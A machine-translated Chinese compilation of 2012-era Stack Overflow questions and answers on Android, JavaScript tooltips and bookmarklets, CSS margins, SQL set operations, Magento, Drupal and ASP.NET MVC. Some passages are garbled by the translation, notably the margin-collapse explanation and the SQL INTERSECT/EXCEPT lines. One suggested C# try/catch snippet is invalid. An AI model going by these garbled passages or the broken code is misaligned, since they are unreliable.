![在此处输入图像描述](../Images/aa5dd2ec810b10cd18bbb6b48c8d8354.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:11:30.337

首先，尽量避免应用菜单，使用操作栏。

在菜单中放置选项时，android 会为您呈现它们。

# javascript - 以编程方式更改 FusionTablesLayer 的颜色

> ID：13704781
> 
> 赞同：0
> 
> 时间：2012-12-04T14:08:42.767
> 
> 标签：javascript, styles, google-fusion-tables

我正在使用融合表中的 kml 将一组多边形读入谷歌地图。我有一个 4 种颜色的数组，我想以编程方式为这 4 种颜色中的一种多边形着色，具体取决于另一个数组中的值。

不知何故，地图一次只能着色 4 个多边形，即使我指定只有 4 种样式。如何为所有 130 个多边形着色？

这是我的代码：

```
function setInitialStyles() {
layer = new google.maps.FusionTablesLayer({
      map : map,
      query : {
        select : "geometry",
        from : "1gwSN6n_00uZ7YuAP7g4FiUiilybqDRlRmWJrpvA"
      }
    });

var options = {
      styles : [
      {
        polygonOptions:
        {
            fillColor: "#ffffff",
            strokeColor: "#bcbcbc",
            fillOpacity: ".75"
        }
    }
    ]
    };

var styles = [];

var style1 = candColor[0];
var style2 = candColor[1];  
var style3 = candColor[2];  
var style4 = candColor[3];  

for (var i=0;i<countyCodes.length; i++) {
  var c = countyCodes[i];
  var whereClause = "'COUSUBFP' = " + c;
  var myStyle;
  if (countyColors[i] == "#0D58A6" ) { myStyle = style1; }
  if (countyColors[i] == "#981400" ) { myStyle = style2; }
  if (countyColors[i] == "#E3D132" ) { myStyle = style3; }
  if (countyColors[i] == "#007F37" ) { myStyle = style4; }

  options.styles.push({
          where: whereClause,
          polygonOptions: {
            fillColor: myStyle
          }
    });

}

 layer.setOptions(options);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:35:28.363

你不能。目前 FusionTablesLayer 仅限于一个样式图层，最多可能有五个应用样式。[请参阅有关FusionTablesLayer 限制](https://developers.google.com/maps/documentation/javascript/layers#FusionTablesLimits)的文档。

`WHERE`您可以定义应用于所有多边形的通用样式规则（如子句）。但同样：您只能定义 5 个这样的规则。

```
layer = new google.maps.FusionTablesLayer({
  query: {
    select: 'geometry',
    from: '1gwSN6n_00uZ7YuAP7g4FiUiilybqDRlRmWJrpvA'
  },
  styles: [{
    polygonOptions: {
        fillColor: "#ffffff",
        strokeColor: "#bcbcbc",
        fillOpacity: ".75"
    }
  }, {
    where: "population < 1000",
    polygonOptions: {
      fillColor: "#0000FF"
    }
  }, {
    where: "population > 10000",
    polygonOptions: {
      fillOpacity: 1.0
    }
  }]
});
layer.setMap(map); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:38:05.727

[正如我在上一个问题中提到的那样，](https://stackoverflow.com/questions/13569744/change-fusion-table-polygon-color-programmatically)您的样式数组只能是 5 个元素

这种[方法（使用 Fusion Tables API v1，当前在名称上匹配，而不是 COUSUBFP，因为您的原始表不包含该列）](http://www.geocodezip.com/v3_simpleMap_FusionTablesDynamicColorB.html)可能对您有用，但它将多边形呈现​​为本机 Google Maps API v3 对象，所以有可能是性能问题。

# android - Android - 从最近的应用程序中删除应用程序

> ID：13704782
> 
> 赞同：4
> 
> 时间：2012-12-04T14:08:48.443
> 
> 标签：android

我正在开发一个安卓应用程序。如果我关闭我的应用程序，我的应用程序将出现在“最近的应用程序”列表中。现在我不想在“最近的应用程序”中显示它。以编程方式关闭我的应用程序后，如何将其从“最近的应用程序列表”中删除。请您分享您的建议。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-04T14:20:48.467

在您`Manifest.xml`中，将以下内容设置为您的*Root Activity*

```
<activity
    android:name=".Your_Root_Activity_Name"
    android:excludeFromRecents="true"
    .... 
</activity> 
```

根据结果​​，您可能还必须使用该`android:noHistory="true"`属性。但不确定您的情况是否需要。

有关此的更多信息：http: [//developer.android.com/guide/topics/manifest/activity-element.html](http://developer.android.com/guide/topics/manifest/activity-element.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:21:12.400

`excludeFromRecents="true"`在 AndroidManifest.xml 中添加到您的活动：

```
<activity android:name=".MainActivity"
          android:excludeFromRecents="true" ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:19:21.367

覆盖`onResume`其他活动中的方法并在那里销毁它们并调用主活动。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-19T12:11:46.627

在您的 AndroidManifest.xml 中，将其用于 Activity：

```
<activity
    android:name="Your Activity"
    android:excludeFromRecents="true"
    android:noHistory="true"
    android:taskAffinity="">
</activity> 
```

# .net - SignalR 有效负载是否不可知？

> ID：13704783
> 
> 赞同：8
> 
> 时间：2012-12-04T14:08:53.690
> 
> 标签：.net, signalr, signalr-hub, signalr.client

SignalR 是否支持除包含 JSON 或文本（如 BSON 等）之外的有效负载吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T17:45:21.097

盒子外面？否。默认情况下，SignalR 仅支持 JSON。但是，它是开源/框架，您可以很容易地进行小修改（适配器）以支持您自己的其他格式。

# magento - 将 Magento 前端路由器更改为自定义 URL

> ID：13704788
> 
> 赞同：0
> 
> 时间：2012-12-04T14:09:03.693
> 
> 标签：magento, url-rewriting, controller

我想将购物车的 URL 路径从**checkout/cart**重命名为**checkout/adverts**。

我尝试了以下两种方法：

**目录 > URL 重写管理：自定义**

![在此处输入图像描述](../Images/f49929897b9fd3cb79f21180c7684ffa.png)

我也尝试过使用自定义模块，在我的 config.xml 中包含以下内容：

```
<global>
   <rewrite>
      <mynamespace_mymodule_checkout_cart>
        <from><![CDATA[#^/checkout/cart#]]></from>
        <to>/checkout/adverts</to>
      </mynamespace_mymodule_checkout_cart>
   </rewrite>
</global> 
```

两种方法都转到了正确的 URL 路径，但显示了 404 错误页面 - 我还需要做些什么吗？Magento 版本。1.5.0.1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T10:27:25.733

正如 RS 所说，您必须在模块中扩展 CartController.php

```
<?php
   require_once('Mage/Checkout/controllers/CartController.php');
    class Mynamespace_Mymodule_CartController extends Mage_Checkout_CartController
       {
       }
 ?> 
```

在其中复制 Mage/Checkout/controllers/CartController.php 的 indexAction()

也在你的 local.xml 中写

```
<mymodule_cart_adverts> 
 // copy the xml code inside <checkout_cart_index> ... </checkout_cart_index> here
</mymodule_cart_adverts> 
```

我还没有尝试过，但它应该可以工作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T15:04:21.907

如果将空控制器添加到自定义模块会发生什么

```
<?php
require_once('Mage/Checkout/controllers/CartController.php');
class Mynamespace_Mymodule_CartController extends Mage_Checkout_CartController
{

} 
```

# javascript - 我可以在 Twitter Bootstrap 的工具提示中使用复杂的 HTML 吗？

> ID：13704789
> 
> 赞同：149
> 
> 时间：2012-12-04T14:09:08.073
> 
> 标签：javascript, html, twitter-bootstrap-3, tooltip

如果我查看[官方文档](http://twitter.github.com/bootstrap/javascript.html#tooltips)，我可以看到一个名为 HTML 的属性：

```
Name    |    Type       |    default  |    Description
----------------------------------------------------------------------------
html    |    boolean    |    false    |    Insert html into the tooltip. 
                                           If false, jquery's text method 
                                           will be used to insert content 
                                           into the dom. Use text if you're 
                                           worried about XSS attacks. 
```

它说，“将 html 插入工具提示”，但类型是布尔值。如何在工具提示中使用复杂的 html？

* * *

## 回答 #1

> 赞同：272
> 
> 时间：2012-12-04T14:43:08.547

这个参数只是关于你是否要在工具提示中使用复杂的 html。将其设置为`true`然后将html打入`title`标签的属性中。

[在此处](http://jsfiddle.net/44khF/200/)查看此小提琴-我已通过标签`data-html="true"`中的 html 属性将 html 属性设置为 true `<a>`，然后仅将其添加到 html ad hoc 中作为示例。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2016-01-19T08:45:31.787

避免将 html 插入*data-title*的另一种解决方案是创建带有工具提示 html 内容的独立 div，并在创建工具提示时参考此 div：

```
<!-- Tooltip link -->
<p><span class="tip" data-tip="my-tip">Hello world</span></p>

<!-- Tooltip content -->
<div id="my-tip" class="tip-content hidden">
    <h2>Tip title</h2>
    <p>This is my tip content</p>
</div>

<script type="text/javascript">
    $(document).ready(function () {
        // Tooltips
        $('.tip').each(function () {
            $(this).tooltip(
            {
                html: true,
                title: $('#' + $(this).data('tip')).html()
            });
        });
    });
</script> 
```

通过这种方式，您可以创建复杂的可读 html 内容，并根据需要激活尽可能多的工具提示。

[在 codepen 上进行](http://codepen.io/migli/pen/jWaGJq)现场演示

* * *

## 回答 #3

> 赞同：35
> 
> 时间：2012-12-04T14:43:33.840

像往常一样，使用`data-original-title`：

html:

```
<div rel='tooltip' data-original-title='<h1>big tooltip</h1>'>Visible text</div> 
```

Javascript：

```
$("[rel=tooltip]").tooltip({html:true}); 
```

html 参数指定如何将工具提示文本转换为 DOM 元素。默认情况下，Html 代码在工具提示中转义以防止 XSS 攻击。假设您在您的网站上显示了一个用户名，并在工具提示中显示了一个小简历。如果 html 代码没有被转义，并且用户可以自己编辑 bio，他们可能会注入恶意代码。

* * *

## 回答 #4

> 赞同：29
> 
> 时间：2012-12-04T14:59:00.770

`html`数据属性完全按照它在文档中所说的那样做。试试这个小例子，不需要 JavaScript（为了澄清而分成几行）：

```
<span rel="tooltip" 
     data-toggle="tooltip" 
     data-html="true" 
     data-title="<table><tr><td style='color:red;'>complex</td><td>HTML</td></tr></table>"
>
hover over me to see HTML
</span> 
```

JSFiddle 演示：

*   [**引导程序 2.x**](http://jsfiddle.net/2KLuT/)
*   [**引导程序 3.x**](http://jsfiddle.net/56arN/)

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2012-12-04T14:50:07.313

如果要将 html 放入工具提示，请将“html”选项设置为 true。实际 html 由选项“title”确定（不应设置链接的 title 属性）

```
$('#example1').tooltip({placement: 'bottom', title: '<p class="testtooltip">par</p>', html: true}); 
```

[现场样品](http://jsfiddle.net/sjsMF/49/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-10-09T14:18:56.840

从 bootstrap 5 开始，您可以`html`在配置时将工具提示的内容指定为 DOM 节点。示例配置...

```
// setup tools tips trigger
const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
const tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
     return new Tooltip(tooltipTriggerEl, {
           html: true // <- this should do the trick!
     })
}); 
```

# html - 带边距的 HTML 框模型

> ID：13704793
> 
> 赞同：3
> 
> 时间：2012-12-04T14:09:16.107
> 
> 标签：html, css

HTML块元素的盒子模型中有一些我无法理解的东西。

请看下面的jsFiddle：

[http://jsfiddle.net/5b7X2/1/](http://jsfiddle.net/5b7X2/1/)

有一个外层和一个内层`<div>`，它们的左、上、右和下都有相同的边距。外部`<div>`的边距是透明的，所以我们可以看到彩色区域周围的白色主体。但是，inner`<div>`的边距仅在左侧和右侧可见。`50px`在我看来，橙色区域的上方和下方应该有一个红色的高度条。

**为什么我错了？**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:11:59.727

垂直[边距](http://www.w3.org/TR/CSS21/box.html#collapsing-margins)相互折叠（根据您可以在该链接另一端找到的一些相当复杂的规则），因此内边距顶部占据外边距顶部的下半部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:22:24.883

我认为这是关于利润崩溃的问题。[http://reference.sitepoint.com/css/collapsingmargins](http://reference.sitepoint.com/css/collapsingmargins)有这方面的信息。

这是一个解决方法/解决方案。

```
<div id="outer">
    &nbsp;
    <div id="inner">
        Text
    </div>
    &nbsp;
</div> 
```

​</p>

# android - 从片段中移除视图

> ID：13704794
> 
> 赞同：1
> 
> 时间：2012-12-04T14:09:16.043
> 
> 标签：android, android-mapview, mapactivity

我正在使用一个地图活动，它有一个托管地图的片段。

所有这些都在一个选项卡内，如下所示

![在此处输入图像描述](../Images/7edd229aa0d9f9b1bd90960e6a91836c.png)

现在每次我在地图选项卡中并转到详细信息选项卡并返回时，我都会收到以下错误。

```
12-04 06:05:37.858: E/AndroidRuntime(20034): java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first. 
```

PlaceActivity.java

```
public class PlaceActivity extends SherlockFragmentActivity implements
        OnShareTargetSelectedListener {

     private static final String MAPS_KEY = "0rQAS47Cicu2t78I-QQ";
        FragmentManager fm = getSupportFragmentManager();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);  
        MapView mMapView = new MapView(PlaceActivity.this, MAPS_KEY);

        mMapView.setClickable(true);
        Exchanger.mMapView = mMapView;

        //setContentView(R.layout.activity_place);

        ActionBar actionBar = getSupportActionBar();
        actionBar.setHomeButtonEnabled(true);
        actionBar.setDisplayHomeAsUpEnabled(true);
        actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

        ActionBar.Tab tabDetails = actionBar.newTab();
        ActionBar.Tab tabMaps = actionBar.newTab();

        tabDetails.setText("Details");
        tabMaps.setText("Maps");

        tabDetails.setTabListener(new MyTabListener());
        tabMaps.setTabListener(new MyTabListener());

        actionBar.addTab(tabDetails);
        actionBar.addTab(tabMaps);
    }

    private class MyTabListener implements ActionBar.TabListener {
        @Override
        public void onTabSelected(Tab tab,
                android.support.v4.app.FragmentTransaction ft) {
            // TODO Auto-generated method stub
            if (tab.getPosition() == 0) {
                DetailsFragment fragment = new DetailsFragment();
                ft.replace(android.R.id.content, fragment);

            } else {

                fm.beginTransaction().add(android.R.id.content, MapSample.GeoGigMapFragment.newInstance()).commit();
                //MapsFragment fragment = new MapsFragment();
                //ft.replace(android.R.id.content, fragment);
                //ft.commit();
            }
        }

        @Override
        public void onTabUnselected(Tab tab,
                android.support.v4.app.FragmentTransaction ft) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onTabReselected(Tab tab,
                android.support.v4.app.FragmentTransaction ft) {
            // TODO Auto-generated method stub
        }

    }
.
.
.
.
.
} 
```

我的地图活动

MapSample.java

```
public class MapSample extends MapActivity {

    MapView mMapView;

    @Override
    protected void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
    }

    public static final class GeoGigMapFragment extends Fragment 
    {

        static GeoGigMapFragment newInstance() 
        {
            GeoGigMapFragment map = new GeoGigMapFragment();
            return map;
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                Bundle savedInstanceState) 
        {
            MapView mMapView = Exchanger.mMapView;
            return mMapView;
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        // ((ViewGroup)mMapView.getParent()).removeView(mMapView);
        // mMapView.removeView(mMapView);

        // mMapView.removeAllViews();

        // ViewParent som = mMapView.getParent();
        // ((ViewGroup) som).removeView(mMapView);

        if (mMapView != null) 
        {
            // NoSaveStateFrameLayout parentView = (NoSaveStateFrameLayout)
            // mMapView.getParent();
            // parentView.removeView(mMapView);
            ((ViewGroup) mMapView.getParent()).removeAllViews();
        }

    }

    @Override
    protected boolean isRouteDisplayed() {
        return false;
    }
} 
```

我想要实现的是每次单击 DetailsTab 时我都想销毁 MapSample 或 Map View，以免出现错误。

完整的错误跟踪

```
12-04 06:26:38.808: E/AndroidRuntime(22066): FATAL EXCEPTION: main
12-04 06:26:38.808: E/AndroidRuntime(22066): java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first.
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.view.ViewGroup.addViewInner(ViewGroup.java:3339)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.view.ViewGroup.addView(ViewGroup.java:3210)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.view.ViewGroup.addView(ViewGroup.java:3155)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.view.ViewGroup.addView(ViewGroup.java:3131)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.support.v4.app.NoSaveStateFrameLayout.wrap(Unknown Source)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.support.v4.app.FragmentManagerImpl.moveToState(Unknown Source)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.support.v4.app.FragmentManagerImpl.moveToState(Unknown Source)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.support.v4.app.BackStackRecord.run(Unknown Source)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.support.v4.app.FragmentManagerImpl.execPendingActions(Unknown Source)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.support.v4.app.FragmentManagerImpl$1.run(Unknown Source)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.os.Handler.handleCallback(Handler.java:725)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.os.Handler.dispatchMessage(Handler.java:92)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.os.Looper.loop(Looper.java:137)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at android.app.ActivityThread.main(ActivityThread.java:5039)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at java.lang.reflect.Method.invokeNative(Native Method)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at java.lang.reflect.Method.invoke(Method.java:511)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
12-04 06:26:38.808: E/AndroidRuntime(22066):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:15:28.667

你在哪一行得到错误？尝试添加

```
contanier.removeAllViews(); 
```

在`onCreateView`方法中

# javascript - getElementsByTagName 在 Chrome 中返回空列表（但不在 Firefox 中）

> ID：13704796
> 
> 赞同：0
> 
> 时间：2012-12-04T14:09:18.177
> 
> 标签：javascript

我有 js 函数，它试图设置 XMLDoc 对象并设置全局参数之一（modelingDiagram）。

在尝试按标签名称获取元素时，它总是返回空列表（但不是在 Firefox 中）。在调试期间，我知道它正在为我在观察区域尝试的任何标签返回空列表 - xmlDoc.getElementsByTagName('Processes'); 或 xmlDoc.getElementsByTagName("desc");

下面是js函数。注释区域表明我在哪里得到了异常。

```
function setXmlDoc(text)
{
if (window.ActiveXObject){
              var doc=new ActiveXObject('Microsoft.XMLDOM');
              doc.async='false';
              doc.loadXML(text);
} else {
              var parser=new DOMParser();
              var doc=parser.parseFromString(text,'text/xml');
}

xmlDoc = doc;
modelingDiagram = xmlDoc.getElementsByTagName('Processes')[0].getElementsByTagName('ModelingDiagram');
//Uncaught TypeError: Cannot call method 'getElementsByTagName' of undefined
} 
```

文本变量包含字符串格式的 xml -

```
<?xml version="1.0" encoding="utf-8"?>
<Processes xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" name="">
  <Process>
    <desc value="Z45 Accounting">Z45 Accounting</desc>
    <height value="541">541</height>
    <width value="411">411</width>
    <xval value="50">50</xval>
    <yval value="50">50</yval>
    <Flowelements>
   ....
   ....
   .... 
```

我无法弄清楚 Chrome 希望在这里获得正确的列表是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T06:37:44.997

根据 W3C DOM 3 核心规范 getElementByTagName() 返回 NodeList 以使“核心”规范独立于“html”规范，Gecko/Firefox 当前返回一个 NodeList（错误 162927），但从 Gecko/Firefox 19 开始，它将返回HTMLCollection（错误 799464）。

但是 DOM4 草案说 getElementByTagName() 应该返回 HTMLCollection。

Internet Explorer、WebKit 和 Opera 当前返回 HTMLCollection。尝试使用 namedItem 方法，这将使它类似于 HTMLCollection。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T14:48:17.327

在深入研究了这个问题之后，我才知道这个 xml 字符串在第 0 个索引处有一些特殊的字符（看不见）。我在执行 alert(text.charAt(0)) 时期待“<”，但它在弹出窗口中没有显示任何字符。这让我意识到 stmt xmlDoc.loadXML(text) 总是返回 false 。

```
text = text.substr(1, text.length); 
```

解决了这个问题。

# mysql - SET 操作和 JOIN 操作

> ID：13704800
> 
> 赞同：1
> 
> 时间：2012-12-04T14:09:33.777
> 
> 标签：mysql

我正在阅读Learning SQL 2nd Edition书。`SET`操作和. 之间有什么区别`JOIN`吗？是否有任何情况下您会选择`SET`操作离开`JOIN`。

如果我错了，请纠正我，我们可以用`JOIN`我们能做的事情来做所有的事情`SET`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:21:40.763

集合操作`UNION`是`INTERSECT`和`EXCEPT`。它们用于对具有**相同模式**的关系进行集合操作。例如：让`R1`和`R2`成为以下模式：

```
R1 (A,B,C)
R2 (A,B,C) 
```

*   R1 `UNION`R2 = 和 中所有行的`R1`并集`R2`。

*   R1 R2 =和`INTERSECT`中的公共行。`R1``R2`

*   R1 R2 =中不存在的`EXCEPT`所有行。`R1``R2`

请注意，我们对**相同的模式**关系使用集合操作，但我们可以对不同的模式关系使用连接操作，结果的模式是两个模式的并集。（通常我们使用连接操作来连接两个或多个表。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:36:56.860

不，你不能用 a 来做所有`join`你可以用 set 操作做的事情。但是，如果两个表具有相同的结构*并且*每个表都有唯一的标识符，那么您可以：

一个`union`将是：

```
select driver.id,
       coalesce(t1.col1, t2.col1) as col1,
       . . .  -- repeat this for all columns
from (select distinct coalesce(t1.id, t2.id) as id
      from ((select id
             from t1
            ) full outer join
            (select id
             from t2
            )
           )
     ) driver left outer join
     t1
     on t1.id = driver.id left outer join
     t2
     on t2.id = driver.id 
```

`except`和`intersect`可以以相同的方式接近，但将条件放在驱动`full outer join`程序表中。

实际上，您可以将此想法扩展为不需要唯一的 id，只需假设每个表中的行都是唯一的。在这种情况下，连接更加复杂，因为您必须包括所有列，并且还要考虑列中的 NULL 值。

也就是说，这些`set`操作有几个优点：

1.  它们更具可读性。您和其他所有人可能会同意这一点，`union`并且`union all`比上述查询更具可读性。
2.  SQL 引擎理解集合操作，因此它们通常会更有效率。
3.  在更复杂的 SQL 语句中很容易出现细微的错误，从而从根本上改变结果。例如，将上面驱动程序表中的“全外连接”更改为“内连接”就是 和 之间的`union`区别`intersect`。

# drupal - Drupal 事件和订阅

> ID：13704812
> 
> 赞同：2
> 
> 时间：2012-12-04T14:10:15.207
> 
> 标签：drupal, drupal-7, drupal-modules, drupal-views

我正在寻找一种方法来制作带有**事件的****日历**。

 **事件可以由经过身份验证的**用户****订阅**。

 **当用户订阅时，他必须**支付**一些项目（活动价格和餐费）。一人可包多餐，不能包多人（用户可以选择用餐的数量，但不能选择要预订的地方数量）

我能怎么做 ？

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-09T07:38:37.983

There's a useful prebuilt Feature for this over on GitHub: [https://github.com/bobchristenson/commerce_event_registration](https://github.com/bobchristenson/commerce_event_registration)

You'll need a few modules: - Webform - Commerce - Webform Validation - Rules - Webform Rules

The last time I used this was some time ago (in fact the last commit on the project was over a year ago), so there may be a few new things to tweak to get it working.

I know it's linked on the GitHub repo, but here's a link to the podcast from Mustardseed about this: [http://mustardseedmedia.com/podcast/episode51](http://mustardseedmedia.com/podcast/episode51)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-10T15:06:08.070

对于事件订阅部分，您可以使用订阅模块，事件是内容类型的“事件”

```
 https://www.drupal.org/project/subscriptions 
```****

# c# - JQGrid如何concat两列？

> ID：13704826
> 
> 赞同：0
> 
> 时间：2012-12-04T14:11:07.217
> 
> 标签：c#, asp.net-mvc, jqgrid

我需要 conccat 两列

名字 + 姓氏。

我需要创建一个列显示名称。

这是怎么做的？接收数据\网格时我不能这样做

```
 ResultGrid = new JQGrid
                {
                    Columns = new List<JQGridColumn>()
                        {
                            new JQGridColumn
                                {
                                    DataField = "ID",
                                    PrimaryKey = true,
                                    Editable = false,
                                    Visible = false,
                                },
                            new JQGridColumn
                                {
                                    DataField = "FirstName",
                                    Visible = false,
                                },
                            new JQGridColumn
                                {
                                    DataField = "LastName",
                                    Visible = false,
                                },
                            new JQGridColumn
                                {
                                    DataField = "EmployeeDisplay",
                                    Editable = false,
                                    Searchable = true,
                                    DataType = typeof(Int32),
                                    SearchToolBarOperation = SearchOperation.IsEqualTo,
                                    SearchType = SearchType.DropDown,
                                    Formatter = new CustomFormatter(){FormatFunction = ""}
                                },
                            new JQGridColumn
                                {
                                    DataField = "Date",
                                    SearchType = SearchType.DatePicker,
                                    DataType = typeof (DateTime),
                                    SearchControlID = "DatePicker",
                                    SearchToolBarOperation = SearchOperation.IsEqualTo,
                                    Editable = false,

                                },
                            new JQGridColumn
                                {
                                    DataField = "Yield",
                                    Editable = false,

                                },
                            new JQGridColumn
                                {
                                    DataField = "Credit",
                                    Editable = false
                                },
                            new JQGridColumn
                                {
                                    DataField = "Balance",
                                    Editable = false
                                },

                        },
                    Width = Unit.Pixel(1000),
                    Height = Unit.Pixel(500)
                }; 
```

数据：

```
 var joinTransationAndEmployee = employees.Join(transaction, e => e.TimeAccountID, tl => tl.AccountID,
                             (employee, log) =>
                             new
                                 {
                                     log.ID,
                                     log.Date,
                                     log.Credit,
                                     log.Yield,
                                     log.Balance,
                                     FirstName= employee.FirstName,
                                     LastName = employee.LastName
                                 });

        return model.ResultGrid.DataBind(joinTransationAndEmployee); 
```

# c# - 如何优雅地处理 ASP.NET MVC 4 中的数据库连接？

> ID：13704830
> 
> 赞同：0
> 
> 时间：2012-12-04T14:11:20.880
> 
> 标签：c#, asp.net-mvc, database, error-handling

在尝试连接到可能已关闭的数据库或在 MVC 4 中给出不正确的连接字符串时，如何优雅地处理错误？

我在 Web.config 中有我的字符串，它访问数据库的方式只是实例化从每个控制器中的 DBContext 派生的类，如下所示：

`private DBEntities db = new DBEntities("database");`

如果数据库已启动且一切正常，则此方法可以正常工作，但如果不是，我网站上的页面会显示此错误：

`Exception Details: System.ComponentModel.Win32Exception: The network path was not found`

显然我不希望出现这种情况，我想做的是找到`try catch`错误并显示自定义错误页面（类似于 404 Page Not Found）。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:14:16.123

这取决于它在哪里`private DBEntities db = new DBEntities("database");`以及何时被调用，但为什么不只是：

```
try {
  private DBEntities db = new DBEntities("database");
} catch (Exception ex) {
  //do something here
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:15:16.100

在函数中进行初始化

```
private DBEntities db;

// then in your function attempt to initialise
try{

db = new DBEntities("database");

db.Connection.Open();

}
catch(Exception ex){

if(db.Connection != ConnectionState.Closed){

db.Connection.Close();
db.Dispose();

//go to error page
}

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T14:21:21.380

首先在共享视图文件夹中添加一个“Error.cshtml”视图。给它一个模型类型 `System.Web.Mvc.HandleErrorInfo`

然后将以下内容添加到您的 web.config 文件中

```
<system.web>
  <customErrors mode="On" defaultRedirect="/Error" />
</system.web> 
```

这将重定向到任何异常的错误视图。

现在只需设置错误页面的样式即可。

我建议您按照其他帖子中的建议尝试 { } catch { }，在您的 catch 块中，使用用户友好的消息重新抛出 - 例如“无法建立数据库连接”。

相当完整的讨论/解释：http: [//www.prideparrot.com/blog/archive/2012/5/exception_handling_in_asp_net_mvc](http://www.prideparrot.com/blog/archive/2012/5/exception_handling_in_asp_net_mvc)

# javascript - IE8 Bookmarklet：无法拖动到书签栏

> ID：13704834
> 
> 赞同：1
> 
> 时间：2012-12-04T14:11:31.650
> 
> 标签：javascript, internet-explorer-8, bookmarklet

所以我最后一次问这个问题的尝试是含糊的。所以我会再试一次。

我创建了一个使用小书签进行填充的系统。现在，在所有主流浏览器（IE8 除外）中，您都可以毫无问题地将小书签拖放/添加到收藏夹。即使尝试手动添加它，它似乎也不起作用。这是代码问题吗？

这是书签代码：

```
javascript:var metatags, my_arr=document.getElementsByTagName('META'), sel=document.selection.createRange().text,d=document, f, counter;
for(counter=0;counter<my_arr.length;counter++)
{
    if(my_arr[counter].name.toLowerCase()=='description')
    {
        metatags=my_arr[counter].content;
    }
}
f='http://xxxxxxxxxxx.co.za/common/UserControls/ShareThis/ShareThis.aspx', l=d.location, e=encodeURIComponent,u=f+'?u='+e(l.href)+'&t='+e(d.title)+'&s='+e(sel.length<1?metatags?metatags:'':sel)+'&v=4';

a=function()
{
    if(!window.open(u, 't', 'toolbar=0, resizable=1, scrollbars=1, status=1, width=720, height=570'))
        l.href=u;
};
a(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-06T17:18:05.457

右键单击小书签，然后选择“添加到收藏夹”。然后单击新书签。如果它不起作用，那就是代码问题。

此外，一般情况下，复制/粘贴到 IE8 网址栏也应该可以正常工作。

我测试了你的小书签，效果很好。以下是我使用和测试过的，它有效。我通过复制/粘贴到 URL 栏中进行了测试。

```
javascript:var metatags,my_arr=document.getElementsByTagName('META'),sel=document.selection.createRange().text,d=document,f,counter;for(counter=0;counter<my_arr.length;counter++){if(my_arr[counter].name.toLowerCase()=='description'){metatags=my_arr[counter].content}}f='http://xxxxxxxxxxx.co.za/common/UserControls/ShareThis/ShareThis.aspx',l=d.location,e=encodeURIComponent,u=f+'?u='+e(l.href)+'&t='+e(d.title)+'&s='+e(sel.length<1?metatags?metatags:'':sel)+'&v=4';a=function(){if(!window.open(u,'t','toolbar=0, resizable=1, scrollbars=1, status=1, width=720, height=570'))l.href=u};a(); 
```

Sometimes bookmarklet problems are related to conversion of the readable code into bookmarklet format. I created above using [http://javascriptcompressor.com/](http://javascriptcompressor.com/)

# c++ - 为什么我在使用组合而不是继承时得到 C4624（基类析构函数不可访问）？

> ID：13704835
> 
> 赞同：3
> 
> 时间：2012-12-04T14:11:32.427
> 
